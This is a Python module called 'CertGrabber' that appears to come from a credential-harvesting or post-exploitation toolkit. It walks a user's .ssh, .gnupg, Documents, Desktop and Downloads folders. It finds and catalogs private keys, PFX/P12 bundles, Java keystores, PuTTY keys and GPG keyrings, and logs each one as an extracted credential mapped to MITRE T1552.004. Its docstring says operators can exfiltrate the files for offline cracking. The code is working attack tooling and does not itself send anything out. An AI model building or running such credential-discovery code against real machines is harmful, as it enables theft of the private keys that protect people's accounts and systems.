"""
CertGrabber — Discover and catalog certificate/key stores

Targets:
- PFX/P12 files (private keys + certs, often password-protected)
- PEM files with private keys
- GPG keyrings (~/.gnupg/)
- SSH agent keys
- Java KeyStores (.jks, .keystore)

This module focuses on discovery and metadata extraction rather than
cracking certificate passwords. Operators can exfiltrate the files
for offline analysis.

MITRE ATT&CK: T1552.004 (Private Keys), T1588.004 (Digital Certificates)
"""

from __future__ import annotations

import os

from .base import GrabberContext, GrabberModule
from .models import ExtractedCredential, GrabberResult, GrabberStatus, PrivilegeLevel
from .utils import safe_read_binary


class CertGrabber(GrabberModule):
    name = "cert"
    description = "Discover private keys, certificates, GPG keyrings, Java keystores"
    min_privilege = PrivilegeLevel.USER
    supported_platforms = ("Windows", "Darwin", "Linux")
    default_enabled = True

    _SEARCH_DIRS = [
        "{home}/.ssh",
        "{home}/.gnupg",
        "{home}/Documents",
        "{home}/Desktop",
        "{home}/Downloads",
    ]

    _KEY_EXTENSIONS = {".pem", ".key", ".pfx", ".p12", ".jks", ".keystore", ".ppk"}

    _PEM_HEADER = b"-----BEGIN"

    def preflight_check(self, context: GrabberContext) -> bool:
        for template in self._SEARCH_DIRS:
            path = template.format(home=context.user_profile_path)
            if os.path.isdir(path):
                return True
        return False

    def execute(self, context: GrabberContext) -> GrabberResult:
        result = GrabberResult(module_name=self.name)

        # Search known directories for key/cert files
        for template in self._SEARCH_DIRS:
            base = template.format(home=context.user_profile_path)
            if not os.path.isdir(base):
                continue

            creds = self._scan_directory(base, max_depth=2)
            result.credentials.extend(creds)

        # GPG keyring
        gnupg_dir = os.path.join(context.user_profile_path, ".gnupg")
        if os.path.isdir(gnupg_dir):
            gpg_creds = self._catalog_gnupg(gnupg_dir)
            result.credentials.extend(gpg_creds)

        if result.credentials:
            key_count = len([c for c in result.credentials if c.credential_type == "key"])
            cert_count = len([c for c in result.credentials if c.credential_type == "certificate"])
            result.findings.append(self.make_finding(
                file_path=context.user_profile_path,
                description=f"Found {key_count} private key(s), {cert_count} certificate(s)",
                score=60 * min(key_count + cert_count, 3),
                matched_value="PKI",
            ))

        result.status = GrabberStatus.COMPLETED
        return result

    def _scan_directory(self, base_dir: str, max_depth: int = 2) -> list[ExtractedCredential]:
        """Recursively scan for key/cert files by extension and content."""
        creds = []

        def _walk(d: str, depth: int) -> None:
            if depth > max_depth:
                return
            try:
                with os.scandir(d) as entries:
                    for entry in entries:
                        try:
                            if entry.is_file(follow_symlinks=False):
                                ext = os.path.splitext(entry.name)[1].lower()
                                if ext in self._KEY_EXTENSIONS:
                                    cred = self._classify_key_file(entry.path, entry.name)
                                    if cred:
                                        creds.append(cred)
                                elif ext in (".pem", ".crt", ".cer"):
                                    # Check if it contains a private key
                                    data = safe_read_binary(entry.path, max_size=64 * 1024)
                                    if data and self._PEM_HEADER in data and b"PRIVATE KEY" in data:
                                        creds.append(ExtractedCredential(
                                            source_module=self.name,
                                            credential_type="key",
                                            target_application="PEM Private Key",
                                            url=entry.path,
                                            notes=f"Contains private key material",
                                            mitre_technique="T1552.004",
                                        ))
                            elif entry.is_dir(follow_symlinks=False) and not entry.name.startswith("."):
                                _walk(entry.path, depth + 1)
                        except (PermissionError, OSError):
                            continue
            except (PermissionError, OSError):
                pass

        _walk(base_dir, 0)
        return creds

    def _classify_key_file(self, path: str, name: str) -> ExtractedCredential | None:
        """Classify a key/cert file and extract metadata."""
        ext = os.path.splitext(name)[1].lower()
        size = 0
        try:
            size = os.path.getsize(path)
        except OSError:
            pass

        type_map = {
            ".pfx": ("key", "PKCS#12 (PFX)"),
            ".p12": ("key", "PKCS#12 (P12)"),
            ".pem": ("key", "PEM Key"),
            ".key": ("key", "Private Key"),
            ".ppk": ("key", "PuTTY Private Key"),
            ".jks": ("key", "Java KeyStore"),
            ".keystore": ("key", "Java KeyStore"),
        }

        cred_type, app = type_map.get(ext, ("certificate", "Certificate"))

        return ExtractedCredential(
            source_module=self.name,
            credential_type=cred_type,
            target_application=app,
            url=path,
            notes=f"size={size} bytes",
            mitre_technique="T1552.004",
        )

    @staticmethod
    def _catalog_gnupg(gnupg_dir: str) -> list[ExtractedCredential]:
        """Catalog GPG keyring files."""
        creds = []
        key_files = ["secring.gpg", "pubring.gpg", "private-keys-v1.d"]

        for name in key_files:
            path = os.path.join(gnupg_dir, name)
            if os.path.exists(path):
                is_private = "sec" in name or "private" in name
                creds.append(ExtractedCredential(
                    source_module="cert",
                    credential_type="key" if is_private else "certificate",
                    target_application="GPG Keyring",
                    url=path,
                    notes="Contains private key material" if is_private else "Public keyring",
                    mitre_technique="T1552.004",
                ))
        return creds
